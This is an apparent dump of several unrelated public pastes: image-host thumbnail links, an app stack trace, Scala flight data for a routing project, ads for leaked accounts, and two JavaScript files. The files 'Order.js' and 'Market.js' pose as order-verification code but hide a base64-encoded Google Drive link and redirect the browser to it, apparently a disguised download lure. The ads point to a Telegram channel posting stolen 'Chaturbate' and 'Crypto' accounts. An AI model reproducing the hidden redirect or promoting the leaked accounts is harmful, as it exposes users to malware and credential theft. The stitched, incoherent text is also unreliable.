src=""https://img103.fappic.com/i/03921/lt1yzpop1nbq_t.jpg""></a><a href=""https://fappic.com/l0or0ychvqzu/wpwvl8pzjku8.jpg""><img src=""https://img103.fappic.com/i/03921/l0or0ychvqzu_t.jpg""></a><a href=""https://fappic.com/tvjg58hijdku/2kkn8cxgsyh2.jpg""><img src=""https://img103.fappic.com/i/03921/tvjg58hijdku_t.jpg""></a><a href=""https://fappic.com/lxhdsdg0uyqz/c8ymeldil1nu.jpg""><img src=""https://img103.fappic.com/i/03921/lxhdsdg0uyqz_t.jpg""></a><a href=""https://fappic.com/ita5oc31jz74/t6ln0crpbiel.jpg""><img src=""https://img103.fappic.com/i/03921/ita5oc31jz74_t.jpg""></a><a href=""https://fappic.com/slf26ijk4ozx/g0e27g2zj8ue.jpg""><img src=""https://img103.fappic.com/i/03921/slf26ijk4ozx_t.jpg""></a><a href=""https://fappic.com/51h56j6qz73i/4q50scp1h61o.jpg""><img src=""https://img103.fappic.com/i/03921/51h56j6qz73i_t.jpg""></a><a href=""https://fappic.com/tj5ogcf0cmbb/ygs0yg5tj0pz.jpg""><img src=""https://img103.fappic.com/i/03921/tj5ogcf0cmbb_t.jpg""></a><a href=""https://fappic.com/2w205g86nzgy/p6dg7f5o5qqs.jpg""><img src=""https://img103.fappic.com/i/03921/2w205g86nzgy_t.jpg""></a><a href=""https://fappic.com/vzpv588sscnz/z3938udg96g7.jpg""><img src=""https://img103.fappic.com/i/03921/vzpv588sscnz_t.jpg""></a><a href=""https://fappic.com/8thv62qcijps/y58vhqqd19a9.jpg""><img src=""https://img103.fappic.com/i/03921/8thv62qcijps_t.jpg""></a><a href=""https://fappic.com/opcqjpu1e5hs/llywmpuic7d5.jpg""><img src=""https://img103.fappic.com/i/03921/opcqjpu1e5hs_t.jpg""></a><a href=""https://fappic.com/o606jtzm7brz/3o7jk06bp7xa.jpg""><img src=""https://img103.fappic.com/i/03921/o606jtzm7brz_t.jpg""></a><a href=""https://fappic.com/7tzodiri5ccy/b18ez0ctlrcs.jpg""><img src=""https://img103.fappic.com/i/03921/7tzodiri5ccy_t.jpg""></a><a href=""https://fappic.com/6jp4ovyi0vqj/2trizc7cg4z7.jpg""><img src=""https://img103.fappic.com/i/03921/6jp4ovyi0vqj_t.jpg""></a><a href=""https://fappic.com/p4g3jcor2w75/zn4h171ufjz2.jpg""><img src=""https://img103.fappic.com/i/03921/p4g3jcor2w75_t.jpg""></a><a href=""https://fappic.com/2r4djsd3qq8r/5oeyjg7pot8h.jpg""><img src=""https://img103.fappic.com/i/03921/2r4djsd3qq8r_t.jpg""></a>
"
Pr01rvxc,Order.js,Ratqueenkslskskwkw,JavaScript,Monday 28th of April 2025 11:10:19 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71505/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3eSzhqU1,Chaturbate with Tokens,kammex,JavaScript,Monday 28th of April 2025 11:07:09 PM CDT,05832 Accounts Posted On https://t.me/leakzbyeminem
qhWQu4ER,2025-04-28T23:02:01.646507,powerampache,PHP,Monday 28th of April 2025 11:02:02 PM CDT,"1.01-80-play (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /10.0.0.3 (port 8282) from /10.0.0.2 (port 44770) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

authorize() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /10.0.0.3 (port 8282) from /10.0.0.2 (port 44770) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /10.0.0.3 (port 8282) from /10.0.0.2 (port 44770) after 15000ms\"" }"",""stackTrace"":[]}"
d2dmrExn,Market.js,Ratqueenkslskskwkw,JavaScript,Monday 28th of April 2025 10:54:57 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13983/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mDLmGnCQ,Crypto Accounts,kammex,JavaScript,Monday 28th of April 2025 10:51:47 PM CDT,71622 Accounts Posted On https://t.me/leakzbyeminem
w8qEqNpW,Datos proyecto,cardel,Scala,Monday 28th of April 2025 10:40:36 PM CDT,"

  val aeropuertosCurso = List(

    Aeropuerto(""CLO"", 100, 200, -500), // Cali
    Aeropuerto(""BOG"", 300, 500, -500), // Bogot√°
    Aeropuerto(""MDE"", 200, 600, -500), // Medell√≠n
    Aeropuerto(""BAQ"", 350, 850, -500), // Barranquilla
    Aeropuerto(""SMR"", 400, 950, -500), // Santa Marta
    Aeropuerto(""CTG"", 300, 800, -500), // Cartagena
    Aeropuerto(""PTY"", 400, 1000, -500), // Ciudad de Panam√°
    Aeropuerto(""JFK"", 2000, 2000, -400), // Nueva York
    Aeropuerto(""MIA"", 1000, 2000, -500), // Miami
    Aeropuerto(""MEX"", 1000, 1000, -600), // Ciudad de M√©xico
    Aeropuerto(""MAD"", 5000, 5000, 100), // Madrid
    Aeropuerto(""SVCS"", 400, 1000, -600), // Caracas
    Aeropuerto(""MID"", 500, 100, -600), // Merida
    Aeropuerto(""AUA"", 500, 2000, -400), // Aruba
    Aeropuerto(""IST"", 9000, 9000, 300), // Estambul
    Aeropuerto(""HND"", 10000, 12000, 900), // Tokio
    Aeropuerto(""DXB"", 9500, 11500, 400), // Dubai
    Aeropuerto(""SVO"", 12500, 12500, 300) // Mosc√∫
  )
  val vuelosCurso = List(
    Vuelo(""AIRVZLA"", 601, ""MID"", 5, 0, ""SVCS"", 6, 0, 0),
    Vuelo(""AIRVZLA"", 602, ""SVCS"", 6, 30, ""MID"", 7, 30, 0),
    Vuelo(""AVA"", 9432, ""CLO"", 7, 0, ""SVO"", 2, 20, 4),
    Vuelo(""AVA"", 9432, ""CLO"", 7, 0, ""BOG"", 8, 0, 0),
    Vuelo(""IBERIA"", 505, ""BOG"", 18, 0, ""MAD"", 12, 0, 0),
    Vuelo(""IBERIA"", 506, ""MAD"", 14, 0, ""SVO"", 23, 20, 0),
    Vuelo(""IBERIA"", 507, ""MAD"", 16, 0, ""SVO"", 1, 20, 0),
    Vuelo(""LATAM"", 787, ""BOG"", 17, 0, ""MEX"", 19, 0, 0),
    Vuelo(""VIVA"", 756, ""BOG"", 9, 0, ""MDE"", 10, 0, 0),
    Vuelo(""VIVA"", 769, ""MDE"", 11, 0, ""BAQ"", 12, 0, 0),
    Vuelo(""AVA"", 5643, ""BAQ"", 14, 0, ""MEX"", 16, 0, 0),
    Vuelo(""COPA"", 1234, ""CTG"", 10, 0, ""PTY"", 11, 30, 0),
    Vuelo(""AVA"", 4321, ""CTG"", 9, 30, ""SMR"", 10, 0, 0),
    Vuelo(""COPA"", 7631, ""SMR"", 10, 50, ""PTY"", 11, 50, 0),
    Vuelo(""TURKISH"", 7799, ""CLO"", 7, 0, ""IST"", 14, 0, 3),
    Vuelo(""QATAR"", 5566, ""IST"", 23, 0, ""SVO"", 2, 0, 0),
  )
  // Venezuela aislada, Cali Moscu, Cali CDMX pasando por Bogota vs pasando por Mde - Baq, CTG - PTY directo o pasando
  // por SMR, Cali Moscu por Estambul tiene 4 escalas pero 2 vuelos, Cali Moscu por Madrid tiene 3 vuelos y 3 escalas
  // pero llega m√°s temprano


  // Datos de aeropuertos en USA
  val aeropuertos=List(
    Aeropuerto(""ABQ"", 195, 275, -800),
    Aeropuerto(""ATL"", 470, 280, -600),
    Aeropuerto(""BNA"", 430, 240, -700),
    Aeropuerto(""BOS"", 590, 100, -600),
    Aeropuerto(""DCA"", 540, 180, -600),
    Aeropuerto(""DEN"", 215, 205, -800),
    Aeropuerto(""DFW"", 310, 305, -700),
    Aeropuerto(""DTW"", 445, 140, -600),
    Aeropuerto(""HOU"", 330, 355, -700),
    Aeropuerto(""JFK"", 565, 130, -600),
    Aeropuerto(""LAX"", 55, 270, -900),
    Aeropuerto(""MIA"", 535, 390, -600),
    Aeropuerto(""MSP"", 340, 115, -700),
    Aeropuerto(""MSY"", 405, 345, -700),
    Aeropuerto(""ORD"", 410, 155, -700),
    Aeropuerto(""PHL"", 550, 155, -600),
    Aeropuerto(""PHX"", 120, 290, -800),
    Aeropuerto(""PVD"", 595, 122, -600),
    Aeropuerto(""RDU"", 530, 230, -600),
    Aeropuerto(""SEA"", 55, 45, -900),
    Aeropuerto(""SFO"", 10, 190, -900),
    Aeropuerto(""STL"", 380, 210, -700),
    Aeropuerto(""TPA"", 500, 360, -600)
  )


  //________________________________________________________

  //longitud 15

  val vuelosA1= List(
    Vuelo(""4X"", 373, ""HOU"", 13, 15, ""MSY"", 15, 10, 1),
    Vuelo(""4X"", 201, ""MSY"", 8, 35, ""HOU"", 12, 20, 2),
    Vuelo(""4X"", 372, ""MSY"", 11, 0, ""HOU"", 12, 55, 1),
    Vuelo(""4X"", 213, ""MSY"", 14, 0, ""HOU"", 17, 40, 3),
    Vuelo(""4X"", 374, ""MSY"", 16, 0, ""HOU"", 17, 55, 1),
    Vuelo(""4X"", 216, ""HOU"", 14, 30, ""MSY"", 18, 10, 3),
    Vuelo(""4X"", 370, ""MSY"", 6, 15, ""HOU"", 11, 0, 1),
    Vuelo(""4X"", 375, ""HOU"", 18, 20, ""MSY"", 10, 15, 1),
    Vuelo(""4X"", 214, ""HOU"", 9, 0, ""MSY"", 12, 40, 3),
    Vuelo(""4X"", 371, ""HOU"", 8, 35, ""MSY"", 10, 30, 1),
    Vuelo(""AA"", 324, ""STL"", 8, 30, ""ORD"", 14, 5, 0),
    Vuelo(""AA"", 828, ""MSY"", 17, 10, ""BNA"", 18, 37, 0),
    Vuelo(""AA"", 212, ""DFW"", 17, 21, ""ORD"", 19, 41, 0),
    Vuelo(""AA"", 673, ""ORD"", 21, 30, ""SEA"", 12, 7, 0),
    Vuelo(""AA"", 25, ""DFW"", 18, 37, ""PHX"", 10, 1, 0)
  )

  val vuelosA2= List(
    Vuelo(""AA"", 35, ""RDU"", 14, 10, ""MIA"", 16, 21, 0),
    Vuelo(""AA"", 179, ""ORD"", 18, 30, ""PHX"", 11, 12, 0),
    Vuelo(""AA"", 580, ""SFO"", 12, 25, ""ORD"", 11, 5, 1),
    Vuelo(""AA"", 70, ""SFO"", 8, 8, ""DFW"", 13, 31, 0),
    Vuelo(""AA"", 835, ""DTW"", 17, 0, ""ORD"", 17, 13, 0),
    Vuelo(""AA"", 890, ""PHX"", 1, 40, ""ORD"", 15, 5, 0),
    Vuelo(""AA"", 784, ""DFW"", 10, 54, ""ORD"", 12, 56, 0),
    Vuelo(""AA"", 796, ""DEN"", 15, 7, ""BNA"", 18, 47, 0),
    Vuelo(""AA"", 89, ""ORD"", 18, 30, ""LAX"", 10, 35, 0),
    Vuelo(""AA"", 920, ""MIA"", 8, 44, ""DCA"", 11, 6, 0),
    Vuelo(""AA"", 728, ""DFW"", 6, 35, ""BOS"", 10, 58, 0),
    Vuelo(""AA"", 837, ""ATL"", 7, 25, ""DFW"", 13, 5, 0),
    Vuelo(""AA"", 203, ""DFW"", 8, 10, ""SFO"", 14, 7, 0),
    Vuelo(""AA"", 334, ""RDU"", 9, 0, ""PVD"", 10, 40, 0),
    Vuelo(""AA"", 709, ""ATL"", 8, 28, ""MIA"", 10, 15, 0)
  )

  val vuelosA3= List(
    Vuelo(""AA"", 400, ""LAX"", 7, 30, ""MIA"", 15, 30, 0),
    Vuelo(""AA"", 978, ""MIA"", 8, 10, ""MSY"", 12, 4, 0),
    Vuelo(""AA"", 348, ""ORD"", 6, 15, ""DFW"", 13, 6, 0),
    Vuelo(""AA"", 71, ""DFW"", 16, 2, ""SFO"", 17, 43, 0),
    Vuelo(""AA"", 860, ""BNA"", 19, 27, ""DTW"", 11, 55, 0),
    Vuelo(""AA"", 749, ""BOS"", 18, 17, ""BNA"", 10, 12, 0),
    Vuelo(""AA"", 673, ""ATL"", 19, 57, ""ORD"", 10, 45, 0),
    Vuelo(""AA"", 926, ""MIA"", 19, 3, ""MSY"", 10, 17, 0),
    Vuelo(""AA"", 926, ""MIA"", 19, 3, ""HOU"", 12, 15, 2),
    Vuelo(""AA"", 586, ""DFW"", 17, 13, ""PHL"", 11, 13, 0),
    Vuelo(""AA"", 637, ""PVD"", 7, 35, ""RDU"", 12, 5, 0),
    Vuelo(""AA"", 329, ""DFW"", 14, 27, ""ABQ"", 15, 15, 0),
    Vuelo(""AA"", 568, ""DFW"", 6, 56, ""DCA"", 10, 33, 0),
    Vuelo(""AA"", 530, ""SFO"", 12, 22, ""BOS"", 12, 54, 1),
    Vuelo(""AA"", 379, ""BOS"", 6, 15, ""ORD"", 15, 4, 0)
  )

  val vuelosA4= List(
    Vuelo(""AA"", 27, ""MIA"", 8, 0, ""SEA"", 11, 27, 0),
    Vuelo(""AA"", 1, ""JFK"", 9, 0, ""LAX"", 11, 39, 0),
    Vuelo(""AA"", 272, ""HOU"", 7, 25, ""DFW"", 13, 7, 0),
    Vuelo(""AA"", 227, ""DFW"", 9, 24, ""LAX"", 10, 17, 0),
    Vuelo(""AA"", 2, ""LAX"", 8, 30, ""JFK"", 16, 46, 0),
    Vuelo(""AA"", 523, ""MIA"", 7, 45, ""DFW"", 15, 1, 0),
    Vuelo(""AA"", 64, ""SFO"", 8, 0, ""JFK"", 16, 23, 0),
    Vuelo(""AA"", 181, ""ORD"", 9, 15, ""LAX"", 11, 10, 0),
    Vuelo(""AA"", 719, ""TPA"", 13, 20, ""DFW"", 14, 56, 0),
    Vuelo(""AA"", 127, ""ORD"", 18, 25, ""SEA"", 10, 58, 0),
    Vuelo(""AA"", 407, ""ORD"", 9, 10, ""PHX"", 11, 53, 0),
    Vuelo(""AA"", 606, ""LAX"", 7, 0, ""DFW"", 11, 57, 0),
    Vuelo(""AA"", 897, ""DCA"", 17, 54, ""MIA"", 10, 31, 0),
    Vuelo(""AA"", 566, ""SFO"", 7, 0, ""BOS"", 17, 19, 1),
    Vuelo(""AA"", 315, ""ORD"", 17, 30, ""BNA"", 18, 54, 0)
  )

  val vuelosA5= List(
    Vuelo(""AA"", 856, ""DFW"", 14, 30, ""HOU"", 15, 39, 0),
    Vuelo(""AA"", 846, ""DFW"", 17, 16, ""DCA"", 11, 4, 0),
    Vuelo(""AA"", 745, ""MIA"", 16, 48, ""DFW"", 19, 5, 0),
    Vuelo(""AA"", 278, ""ORD"", 16, 30, ""BOS"", 19, 47, 0),
    Vuelo(""AA"", 483, ""TPA"", 17, 20, ""RDU"", 19, 1, 0),
    Vuelo(""AA"", 705, ""DCA"", 12, 45, ""ORD"", 13, 52, 0),
    Vuelo(""AA"", 212, ""DFW"", 17, 21, ""DTW"", 12, 40, 1),
    Vuelo(""AA"", 216, ""DFW"", 17, 15, ""STL"", 19, 4, 0),
    Vuelo(""AA"", 692, ""MIA"", 14, 5, ""PHL"", 16, 50, 0),
    Vuelo(""AA"", 705, ""DCA"", 12, 45, ""DEN"", 16, 30, 1),
    Vuelo(""AA"", 281, ""ORD"", 11, 15, ""LAX"", 15, 37, 1),
    Vuelo(""AA"", 501, ""STL"", 13, 5, ""DFW"", 14, 51, 0),
    Vuelo(""AA"", 721, ""DCA"", 11, 59, ""RDU"", 13, 9, 0),
    Vuelo(""AA"", 201, ""PHL"", 7, 24, ""DFW"", 10, 0, 0),
    Vuelo(""AA"", 59, ""JFK"", 8, 0, ""SFO"", 11, 33, 0)
  )
  //__________________________________________________

  //longitud 40

  val vuelosB1= List(
    Vuelo(""AA"", 717, ""DFW"", 20, 0, ""LAX"", 11, 7, 0),
    Vuelo(""AA"", 960, ""MIA"", 19, 7, ""ORD"", 11, 33, 0),
    Vuelo(""AA"", 350, ""LAX"", 1, 50, ""DCA"", 11, 46, 1),
    Vuelo(""AA"", 566, ""BNA"", 13, 55, ""BOS"", 17, 19, 0),
    Vuelo(""AA"", 976, ""MIA"", 13, 40, ""ORD"", 15, 55, 0),
    Vuelo(""AA"", 391, ""ORD"", 14, 55, ""SEA"", 17, 22, 0),
    Vuelo(""AA"", 834, ""DFW"", 20, 0, ""DCA"", 13, 36, 0),
    Vuelo(""AA"", 397, ""MIA"", 13, 10, ""BNA"", 14, 29, 0),
    Vuelo(""AA"", 50, ""DEN"", 13, 20, ""DFW"", 16, 24, 0),
    Vuelo(""AA"", 184, ""ORD"", 14, 50, ""DCA"", 17, 33, 0),
    Vuelo(""AA"", 870, ""MSP"", 8, 28, ""ORD"", 14, 5, 0),
    Vuelo(""AA"", 374, ""MSP"", 14, 2, ""MSY"", 18, 43, 1),
    Vuelo(""AA"", 750, ""RDU"", 19, 45, ""PVD"", 11, 22, 0),
    Vuelo(""AA"", 687, ""BNA"", 14, 5, ""MIA"", 17, 25, 0),
    Vuelo(""AA"", 283, ""BNA"", 19, 38, ""ORD"", 11, 16, 0),
    Vuelo(""AA"", 530, ""BNA"", 19, 35, ""BOS"", 12, 54, 0),
    Vuelo(""AA"", 325, ""ORD"", 20, 20, ""SFO"", 13, 14, 0),
    Vuelo(""AA"", 333, ""DFW"", 11, 20, ""LAX"", 12, 19, 0),
    Vuelo(""AA"", 756, ""MSY"", 11, 58, ""BNA"", 13, 20, 0),
    Vuelo(""AA"", 830, ""ORD"", 16, 40, ""DTW"", 18, 55, 0),
    Vuelo(""AA"", 220, ""SFO"", 12, 45, ""ORD"", 19, 16, 0),
    Vuelo(""AA"", 331, ""PHL"", 16, 10, ""ORD"", 17, 23, 0),
    Vuelo(""AA"", 824, ""MSP"", 17, 45, ""ORD"", 19, 18, 0),
    Vuelo(""AA"", 649, ""PHL"", 8, 5, ""TPA"", 11, 58, 1),
    Vuelo(""AA"", 534, ""PHX"", 2, 35, ""DFW"", 13, 8, 0),
    Vuelo(""AA"", 384, ""MIA"", 15, 24, ""ORD"", 17, 33, 0),
    Vuelo(""AA"", 328, ""DFW"", 19, 59, ""STL"", 11, 34, 0),
    Vuelo(""AA"", 319, ""DCA"", 15, 59, ""ORD"", 17, 10, 0),
    Vuelo(""AA"", 654, ""DFW"", 20, 6, ""MSY"", 11, 33, 0),
    Vuelo(""AA"", 926, ""DFW"", 23, 16, ""HOU"", 12, 15, 0),
    Vuelo(""AA"", 379, ""ORD"", 9, 0, ""DEN"", 10, 37, 0),
    Vuelo(""AA"", 530, ""SFO"", 12, 22, ""BNA"", 18, 38, 0),
    Vuelo(""AA"", 435, ""DTW"", 20, 15, ""LAX"", 13, 29, 1),
    Vuelo(""AA"", 616, ""DFW"", 13, 2, ""MSY"", 14, 32, 0),
    Vuelo(""AA"", 476, ""TPA"", 16, 0, ""DFW"", 17, 42, 0),
    Vuelo(""AA"", 498, ""DFW"", 14, 25, ""MIA"", 18, 4, 0),
    Vuelo(""AA"", 868, ""ATL"", 17, 40, ""RDU"", 18, 57, 0),
    Vuelo(""AA"", 864, ""DFW"", 6, 56, ""ATL"", 15, 3, 0),
    Vuelo(""AA"", 357, ""ATL"", 13, 5, ""ORD"", 13, 55, 0),
    Vuelo(""AA"", 180, ""ORD"", 10, 14, ""ATL"", 13, 4, 0)
  )

  val vuelosB2= List(
    Vuelo(""AA"", 220, ""SFO"", 12, 45, ""ORD"", 19, 16, 0),
    Vuelo(""AA"", 331, ""PHL"", 16, 10, ""ORD"", 17, 23, 0),
    Vuelo(""AA"", 824, ""MSP"", 17, 45, ""ORD"", 19, 18, 0),
    Vuelo(""AA"", 649, ""PHL"", 8, 5, ""TPA"", 11, 58, 1),
    Vuelo(""AA"", 534, ""PHX"", 2, 35, ""DFW"", 13, 8, 0),
    Vuelo(""AA"", 384, ""MIA"", 15, 24, ""ORD"", 17, 33, 0),
    Vuelo(""AA"", 328, ""DFW"", 19, 59, ""STL"", 11, 34, 0),
    Vuelo(""AA"", 319, ""DCA"", 15, 59, ""ORD"", 17, 10, 0),
    Vuelo(""AA"", 654, ""DFW"", 20, 6, ""MSY"", 11, 33, 0),
    Vuelo(""AA"", 926, ""DFW"", 23, 16, ""HOU"", 12, 15, 0),
    Vuelo(""AA"", 379, ""ORD"", 9, 0, ""DEN"", 10, 37, 0),
    Vuelo(""AA"", 530, ""SFO"", 12, 22, ""BNA"", 18, 38, 0),
    Vuelo(""AA"", 435, ""DTW"", 20, 15, ""LAX"", 13, 29, 1),
    Vuelo(""AA"", 616, ""DFW"", 13, 2, ""MSY"", 14, 32, 0),
    Vuelo(""AA"", 476, ""TPA"", 16, 0, ""DFW"", 17, 42, 0),
    Vuelo(""AA"", 498, ""DFW"", 14, 25, ""MIA"", 18, 4, 0),
    Vuelo(""AA"", 868, ""ATL"", 17, 40, ""RDU"", 18, 57, 0),
    Vuelo(""AA"", 864, ""DFW"", 6, 56, ""ATL"", 15, 3, 0),
    Vuelo(""AA"", 357, ""ATL"", 13, 5, ""ORD"", 13, 55, 0),
    Vuelo(""AA"", 180, ""ORD"", 10, 14, ""ATL"", 13, 4, 0),
    Vuelo(""AA"", 881, ""BNA"", 15, 20, ""MSY"", 16, 48, 0),
    Vuelo(""AA"", 715, ""JFK"", 18, 15, ""RDU"", 10, 14, 0),
    Vuelo(""AA"", 246, ""ORD"", 7, 30, ""DCA"", 10, 11, 0),
    Vuelo(""AA"", 73, ""DTW"", 7, 45, ""ORD"", 10, 1, 0),
    Vuelo(""AA"", 705, ""ORD"", 14, 55, ""DEN"", 16, 30, 0),
    Vuelo(""AA"", 262, ""ORD"", 7, 0, ""ATL"", 14, 7, 0),
    Vuelo(""AA"", 389, ""DFW"", 18, 42, ""LAX"", 19, 46, 0),
    Vuelo(""AA"", 528, ""STL"", 11, 28, ""ORD"", 12, 32, 0),
    Vuelo(""AA"", 382, ""MSY"", 7, 0, ""DFW"", 12, 4, 0),
    Vuelo(""AA"", 240, ""SFO"", 13, 25, ""DFW"", 18, 53, 0),
    Vuelo(""AA"", 880, ""DFW"", 12, 57, ""MIA"", 16, 39, 0),
    Vuelo(""AA"", 460, ""ORD"", 14, 50, ""BNA"", 16, 12, 0),
    Vuelo(""AA"", 614, ""DFW"", 8, 15, ""MIA"", 11, 51, 0),
    Vuelo(""AA"", 11, ""BOS"", 9, 0, ""LAX"", 12, 18, 0),
    Vuelo(""AA"", 313, ""MSP"", 18, 25, ""DEN"", 12, 49, 1),
    Vuelo(""AA"", 15, ""JFK"", 21, 15, ""SFO"", 12, 25, 0),
    Vuelo(""AA"", 839, ""DCA"", 8, 8, ""BNA"", 11, 0, 0),
    Vuelo(""AA"", 380, ""LAX"", 15, 11, ""ORD"", 11, 15, 0),
    Vuelo(""AA"", 350, ""LAX"", 1, 50, ""BNA"", 14, 9, 0),
    Vuelo(""AA"", 466, ""MIA"", 13, 45, ""ATL"", 15, 50, 0)
  )

  val vuelosB3= List(
    Vuelo(""AA"", 441, ""PHL"", 18, 50, ""RDU"", 10, 13, 0),
    Vuelo(""AA"", 150, ""DFW"", 20, 8, ""ORD"", 12, 15, 0),
    Vuelo(""AA"", 419, ""DFW"", 11, 8, ""DEN"", 12, 7, 0),
    Vuelo(""AA"", 840, ""DFW"", 10, 57, ""RDU"", 14, 31, 0),
    Vuelo(""AA"", 206, ""DFW"", 11, 6, ""TPA"", 14, 18, 0),
    Vuelo(""AA"", 464, ""DFW"", 14, 39, ""STL"", 16, 20, 0),
    Vuelo(""AA"", 716, ""SEA"", 9, 40, ""PVD"", 19, 41, 1),
    Vuelo(""AA"", 848, ""PHX"", 12, 25, ""BOS"", 10, 50, 1),
    Vuelo(""AA"", 455, ""ORD"", 18, 14, ""DEN"", 19, 49, 0),
    Vuelo(""AA"", 402, ""STL"", 17, 55, ""ORD"", 19, 20, 0),
    Vuelo(""AA"", 562, ""ORD"", 16, 14, ""DCA"", 18, 58, 0),
    Vuelo(""AA"", 42, ""SFO"", 9, 30, ""ORD"", 15, 20, 0),
    Vuelo(""AA"", 470, ""DFW"", 8, 11, ""ORD"", 10, 19, 0),
    Vuelo(""AA"", 17, ""JFK"", 12, 0, ""SFO"", 15, 21, 0),
    Vuelo(""AA"", 862, ""DFW"", 12, 49, ""JFK"", 17, 25, 0),
    Vuelo(""AA"", 340, ""HOU"", 19, 18, ""DFW"", 10, 25, 0),
    Vuelo(""AA"", 740, ""PHX"", 12, 50, ""DFW"", 16, 17, 0),
    Vuelo(""AA"", 385, ""ATL"", 16, 30, ""DFW"", 17, 47, 0),
    Vuelo(""AA"", 235, ""ORD"", 11, 55, ""PHX"", 14, 34, 0),
    Vuelo(""AA"", 414, ""MIA"", 11, 25, ""DCA"", 13, 57, 0),
    Vuelo(""AA"", 281, ""ORD"", 11, 15, ""DFW"", 13, 35, 0),
    Vuelo(""AA"", 134, ""ABQ"", 11, 54, ""ORD"", 15, 39, 0),
    Vuelo(""AA"", 822, ""DFW"", 19, 56, ""MSP"", 12, 9, 0),
    Vuelo(""AA"", 473, ""DCA"", 12, 36, ""DFW"", 15, 1, 0),
    Vuelo(""AA"", 409, ""ORD"", 12, 0, ""LAX"", 13, 58, 0),
    Vuelo(""AA"", 548, ""DFW"", 6, 35, ""MSY"", 15, 1, 0),
    Vuelo(""AA"", 810, ""DFW"", 12, 51, ""RDU"", 16, 18, 0),
    Vuelo(""AA"", 580, ""DFW"", 7, 0, ""ORD"", 11, 5, 0),
    Vuelo(""AA"", 469, ""ORD"", 10, 20, ""MIA"", 14, 17, 0),
    Vuelo(""AA"", 570, ""PHX"", 10, 10, ""DFW"", 13, 29, 0),
    Vuelo(""AA"", 480, ""LAX"", 12, 35, ""DFW"", 17, 40, 0),
    Vuelo(""AA"", 208, ""ORD"", 6, 45, ""PVD"", 14, 6, 0),
    Vuelo(""AA"", 504, ""DFW"", 12, 45, ""ATL"", 15, 40, 0),
    Vuelo(""AA"", 382, ""MSY"", 7, 0, ""DTW"", 13, 7, 1),
    Vuelo(""AA"", 81, ""ORD"", 14, 55, ""MSP"", 16, 23, 0),
    Vuelo(""AA"", 702, ""TPA"", 13, 0, ""RDU"", 14, 35, 0),
    Vuelo(""AA"", 386, ""HOU"", 11, 55, ""MIA"", 15, 28, 0),
    Vuelo(""AA"", 16, ""SFO"", 12, 30, ""JFK"", 10, 46, 0),
    Vuelo(""AA"", 629, ""DFW"", 10, 55, ""MSP"", 13, 9, 0),
    Vuelo(""AA"", 484, ""SFO"", 23, 40, ""ORD"", 15, 1, 0)
  )

  val vuelosB4= List(
    Vuelo(""AA"", 687, ""STL"", 12, 2, ""BNA"", 13, 5, 0),
    Vuelo(""AA"", 117, ""ORD"", 11, 55, ""SFO"", 14, 27, 0),
    Vuelo(""AA"", 435, ""DTW"", 20, 15, ""ORD"", 10, 28, 0),
    Vuelo(""AS"", 234, ""SEA"", 12, 0, ""LAX"", 14, 35, 0),
    Vuelo(""AS"", 613, ""PHX"", 11, 10, ""SEA"", 13, 10, 0),
    Vuelo(""AS"", 605, ""PHX"", 13, 5, ""SEA"", 15, 5, 0),
    Vuelo(""AS"", 608, ""SEA"", 18, 15, ""PHX"", 11, 55, 0),
    Vuelo(""AS"", 263, ""LAX"", 17, 20, ""SEA"", 10, 0, 0),
    Vuelo(""AS"", 607, ""PHX"", 18, 5, ""SEA"", 10, 55, 1),
    Vuelo(""AS"", 25, ""LAX"", 18, 0, ""SEA"", 10, 40, 0),
    Vuelo(""AS"", 195, ""SFO"", 16, 25, ""SEA"", 18, 20, 0),
    Vuelo(""AS"", 157, ""SFO"", 17, 30, ""SEA"", 19, 25, 0),
    Vuelo(""AS"", 146, ""SEA"", 7, 45, ""SFO"", 14, 0, 0),
